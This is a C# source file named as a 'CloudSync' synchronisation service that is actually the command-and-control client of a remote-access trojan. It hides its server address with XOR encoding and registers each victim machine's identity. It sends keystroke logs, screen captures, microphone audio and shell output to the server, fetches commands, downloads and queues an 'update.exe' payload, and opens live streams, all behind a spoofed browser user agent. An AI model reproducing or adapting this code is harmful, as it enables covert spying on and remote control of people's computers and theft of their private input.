using CloudSync.Services.Modules.Stream.Signaling;
using Imagekit.Sdk;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static CloudSync.Services.Core.SyncService;

namespace CloudSync.Services.Core
{
    public class SyncService
    {
        
        public static ConcurrentQueue<Command> commands = new ConcurrentQueue<Command>();
        public static readonly SemaphoreSlim Signal = new SemaphoreSlim(0);

        // XOR-encoded URL (key=0x5A)
        private static readonly byte[] _enc = new byte[] {
            0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x6b, 0x6e, 0x6b, 0x74, 0x6b,
            0x6b, 0x74, 0x6b, 0x62, 0x6f, 0x74, 0x63, 0x68, 0x60, 0x62, 0x62, 0x6a,
            0x6b, 0x75, 0x3b, 0x2a, 0x33
        };
        public static readonly string URL = _Decode(_enc);

        private static string _Decode(byte[] data)
        {
            char[] result = new char[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (char)(data[i] ^ 0x5A);
            return new string(result);
        }

        public async static Task Register(int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        var payload = new
                        {
                            machine_id = AppConfig.GetMachineId(),
                            hostname = AppConfig.GetHostname(),
                            username = AppConfig.GetUsername(),
                            os = AppConfig.OS(),
                            process_id = $"{AppConfig.GetProcessId()}",
                            key = AppConfig.GetMachineId().Substring(0, 32),
                            iv = AppConfig.GetMachineId().Substring(0, 16),
                            hash = AppConfig.GetHash()
                        };
                        string json = JsonConvert.SerializeObject(payload);

                        using (var request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/register"))
                        {
                            request.Content = new StringContent(json, Encoding.UTF8, "application/json");
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                            HttpResponseMessage response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                            string content = await response.Content.ReadAsStringAsync();

                            Result<string> result = JsonConvert.DeserializeObject<Result<string>>(content);
                            if (result.Status.ToLower() != "success")
                            {
                                await Task.Delay(30 * 1000);
                                await Register(depth - 1);
                            }

                            if (result.Data != null)
                            {
                                await DownloadUpdate(result.Data.GetType().GetProperty("url").ToString());
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    //Console.WriteLine(e.Message);
                    await Task.Delay(30 * 1000);
                    await Register(depth - 1);
                }
            }
        }

        public async static Task UploadImage(byte[] image, string commandId, string type, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/capture-{type}"))
                        {
                            MultipartFormDataContent formData = new MultipartFormDataContent();
                            formData.Add(new StringContent(AppConfig.GetMachineId()), "id");
                            formData.Add(new StringContent(commandId), "command_id");

                            ByteArrayContent imageContent = new ByteArrayContent(image);
                            imageContent.Headers.ContentType = MediaTypeHeaderValue.Parse("image/png");
                            formData.Add(imageContent, "image", "image.png");

                            request.Content = formData;
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                            HttpResponseMessage response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                catch
                {
                    await Task.Delay(30 * 1000);
                    await UploadImage(image, commandId, type, depth - 1);
                }
            }
        }

        public async static Task UploadAudio(byte[] wavData, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/capture-audio"))
                        {
                            MultipartFormDataContent formData = new MultipartFormDataContent();
                            formData.Add(new StringContent(AppConfig.GetMachineId()), "id");

                            //StreamContent audioContent = new StreamContent(memoryStream);
                            //audioContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("audio/wav");
                            //formData.Add(audioContent, "file", $"{DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()}.wav");
                            var fileName = $"{DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()}.wav";

                            var audioContent = new ByteArrayContent(wavData);
                            audioContent.Headers.ContentType =
                                new System.Net.Http.Headers.MediaTypeHeaderValue("audio/wav");

                            // IMPORTANT: field name must match Laravel's expected input name (e.g. "audio" or "file")
                            formData.Add(audioContent, "audio", fileName);

                            request.Content = formData;
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                            HttpResponseMessage response = await client.SendAsync(request);
                            string body = await response.Content.ReadAsStringAsync();
                            //Console.WriteLine(body);
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                catch
                {
                    await Task.Delay(30 * 1000);
                    await UploadAudio(wavData, depth - 1);
                }
            }
        }

        public async static Task UploadKeylogs(string log, string command_id, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        var payload = new
                        {
                            id = AppConfig.GetMachineId(),
                            command_id,
                            log
                        };
                        string json = JsonConvert.SerializeObject(payload);

                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/capture-keylog"))
                        {
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                            request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                            HttpResponseMessage response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                catch
                {
                    await Task.Delay(30 * 1000);
                    await UploadKeylogs(log, command_id, depth - 1);
                }
            }
        }

        public async static Task UploadShellOutput(string output, string command_id, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    //Console.WriteLine($"MACHINE ID: {AppConfig.GetMachineId()}");
                    using (HttpClient client = new HttpClient())
                    {
                        var payload = new
                        {
                            id = AppConfig.GetMachineId(),
                            command_id,
                            output
                        };
                        string json = JsonConvert.SerializeObject(payload);

                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/capture-shell"))
                        {
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                            request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                            HttpResponseMessage response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                catch (Exception e)
                {
                    //Console.WriteLine(e.Message);
                    await Task.Delay(30 * 1000);
                    await UploadShellOutput(output, command_id, depth - 1);
                }
            }
        }

        public async static Task GetCommands()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, $"{URL}/command?id={AppConfig.GetMachineId()}"))
                    {
                        request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                        request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                        HttpResponseMessage response = await client.SendAsync(request);
                        string content = await response.Content.ReadAsStringAsync();
                        //Console.WriteLine(content);

                        Result<List<Command>> result = JsonConvert.DeserializeObject<Result<List<Command>>>(content);
                        if (result.Status.ToLower() == "success")
                        {
                            foreach (Command command in result.Data)
                            {
                                commands.Enqueue(command);
                                Signal.Release();
                            }
                        }
                    }
                }
            }
            catch (Exception ex){ }
        }

        public async static Task DownloadUpdate(string url)
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string appFolder = Path.Combine(localAppData, AppConfig.APP);
                Directory.CreateDirectory(appFolder);
                string savedPath = Path.Combine(appFolder, "update.exe");

                using (HttpClient httpClient = new HttpClient())
                {
                    byte[] data = await httpClient.GetByteArrayAsync(url);
                    File.WriteAllBytes(savedPath, data);

                    Command command = new Command
                    {
                        Id = null,
                        Cmd = "update",
                        Extra = savedPath,
                    };

                    commands.Enqueue(command);
                    Signal.Release();
                }
            } catch { }
        }

        public async static Task<Stream> GetLivestreamSession(string session, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, $"{URL}/livestream-session?id={session}&target_id={AppConfig.GetMachineId()}"))
                        {
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                            HttpResponseMessage response = await client.SendAsync(request);
                            string content = await response.Content.ReadAsStringAsync();

                            Result<List<Stream>> result = JsonConvert.DeserializeObject<Result<List<Stream>>>(content);
                            if (result.Status.ToLower() == "success")
                            {
                                return result.Data[0];
                            }
                        }
                    }
                }
                catch
                {
                    await Task.Delay(2 * 1000);
                    await GetLivestreamSession(session, depth - 1);
                }
            }

            return null;
        }

        public async static Task SendSdpOffer(string sdp, string session, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        var payload = new
                        {
                            id = session,
                            machine_id = AppConfig.GetMachineId(),
                            sdp
                        };
                        string json = JsonConvert.SerializeObject(payload);

                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/livestream-offer"))
                        {
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                            request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                            HttpResponseMessage response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                catch
                {
                    await Task.Delay(2 * 1000);
                    await SendSdpOffer(sdp, session, depth - 1);
                }
            }
        }

        public async static Task SetIceCandidate(object candidate, string session, int depth)
        {
            if (depth > 0)
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        var payload = new
                        {
                            id = session,
                            machine_id = AppConfig.GetMachineId(),
                            candidate
                        };
                        string json = JsonConvert.SerializeObject(payload);

                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/livestream-ice/client"))
                        {
                            request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                            request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                            request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                            HttpResponseMessage response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                catch
                {
                    await Task.Delay(2 * 1000);
                    await SetIceCandidate(candidate, session, depth - 1);
                }
            }
        }

        public class Result<T>
        {
            [JsonProperty("status")]
            public string Status { get; set; }
            [JsonProperty("message")]
            public string Message { get; set; }
            [JsonProperty("data")]
            public T Data { get; set; }
        }

        public class Stream
        {
            [JsonProperty("offer")]
            public string Offer { get; set; }
            [JsonProperty("answer")]
            public string Answer { get; set; }
            [JsonProperty("client_ice")]
            public dynamic ClientIce { get; set; }
            [JsonProperty("admin_ice")]
            public IceCandidateDto AdminIce { get; set; }
        }

        public class Command
        {
            [JsonProperty("id")]
            public string Id { get; set; }
            [JsonProperty("command")]
            public string Cmd {  get; set; }
            [JsonProperty("extra")]
            public string Extra { get; set; }
        }
    }
}
